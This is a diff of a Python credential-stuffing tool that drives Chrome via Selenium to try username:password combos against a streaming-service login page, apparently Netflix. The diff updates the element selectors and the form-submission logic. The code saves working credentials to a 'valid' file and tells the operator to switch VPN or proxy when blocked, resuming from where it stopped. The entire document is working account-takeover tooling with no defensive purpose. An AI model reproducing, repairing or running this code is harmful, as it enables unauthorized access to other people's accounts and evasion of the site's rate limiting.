@@ -12,6 +12,8 @@ from countries import countries
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver import ActionChains
 
 details = [find_IP()[0], find_IP()[1], find_IP()[2]]
 current_split_method = determine_split_method()
@@ -106,70 +108,58 @@ while True:
 				print("\033[38;5;7m\nResume file found. Resuming from given combo.")	
 			print_ip_and_country()
 			while counter < len(user):
-					if len(user) == 0:
-						print("\n\033[38;5;226mNo Accounts for current country.\n")
-						break
-					try:
-						print("\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')
-						browser_options = Options()
-						browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
-						browser = webdriver.Chrome(options = browser_options)
-						browser.set_window_size(10,10)		
-						browser.get(page)
-						browser.minimize_window()		
-						time.sleep(0.4)
-						login = browser.find_element(By.XPATH, '//*[@id="id_userLoginId"]')
-						password = browser.find_element(By.XPATH, '//*[@id="id_password"]')
-						button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
-						login.send_keys(user[counter])
-						time.sleep(0.2)
-						password.send_keys(passw[counter].strip())
-						time.sleep(0.2)
-						button.click()
-						time.sleep(2)		
-						if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'):
-							login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
-							if "Sorry, we can't find an account with this email address." in login_error:
-								print("\033[38;5;196m Invalid Email",end='')
-							if "Sorry, we can't find an account with this number." in login_error:			
-								print("\033[38;5;196m Invalid Number",end='')
-							if "We are having technical difficulties and are actively working on a fix" in login_error:
-								print("\033[38;5;196m General Login Error",end='')
-							if "Incorrect password" in login_error:
-								print("\033[38;5;196m Invalid Password",end='')
-						if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[2]/div/div[2]/button'):
-							print("\033[38;5;196m Incomplete Sign Up",end='')
-						if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
-							print("\033[38;5;196m Account Cancelled",end='')
-						if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
-							print("\033[38;5;46m Valid Account - Stored",end='')
-							hits += 1
-							with open('valid','a') as valid:
-								valid.write("{}:{}\n".format(user[counter],passw[counter]))
-						if len(updated_list) > 1:
-							del updated_list[0]		
-						if clear_page > 10:
-							title()
-							print_ip_and_country()
-							clear_page = 0
-						time.sleep(1)
-						counter += 1
-						clear_page += 1
-						browser.close()
-						sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8"%(hits, str(counter), str(len(user))))
-						sys.stdout.flush()					
-						
-					except:
-					
-						request = requests.get(page)		
-						if request.status_code == 403:
-							print("\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
-							with open('resume','a') as resume:
-								for line in range(len(updated_list)):
-									resume.write("{}\n".format(updated_list[line].strip()))
-							resume.close()
-							exit()
-							
+				if len(user) == 0:
+					print("\n\033[38;5;226mNo Accounts for current country.\n")
+					break
+				try:
+					print("\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')
+					browser_options = Options()
+					browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
+					browser = webdriver.Chrome(options = browser_options)
+					browser.set_window_size(600,600)
+					browser.get(page)
+					time.sleep(0.7)
+					login = browser.find_element(By.XPATH, '//input[@type="email"]')
+					password = browser.find_element(By.XPATH, '//input[@type="password"]')
+					login.send_keys(user[counter])
+					time.sleep(0.7)
+					password.send_keys(passw[counter].strip())
+					time.sleep(0.7)
+					action = ActionChains(browser)
+					password.send_keys(Keys.TAB)
+					password.send_keys(Keys.ENTER)
+					time.sleep(3)
+					if browser.find_element(By.XPATH, '//div[@role="alert"]'):
+						print("\033[38;5;196m Invalid Account",end='')
+					if browser.find_element(By.XPATH, '//div[@class="profiles-gate-container"]'):
+						print("\033[38;5;46m Valid Account - Stored",end='')
+						hits += 1
+						with open('valid','a') as valid:
+							valid.write("{}:{}\n".format(user[counter],passw[counter]))
+				except:
+					request = requests.get(page)
+					if request.status_code == 403:
+						print(
+							"\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
+						with open('resume', 'a') as resume:
+							for line in range(len(updated_list)):
+								resume.write("{}\n".format(updated_list[line].strip()))
+						resume.close()
+						exit()
+				if len(updated_list) > 1:
+					del updated_list[0]
+				if clear_page > 10:
+					title()
+					print_ip_and_country()
+					clear_page = 0
+				time.sleep(1)
+				counter += 1
+				clear_page += 1
+				browser.close()
+				sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8"%(hits, str(counter), str(len(user))))
+				sys.stdout.flush()
+
+
 			print("\n\033[38;5;226mAll done.")
 			input("\n\033[38;5;226mPress Enter.")
 			
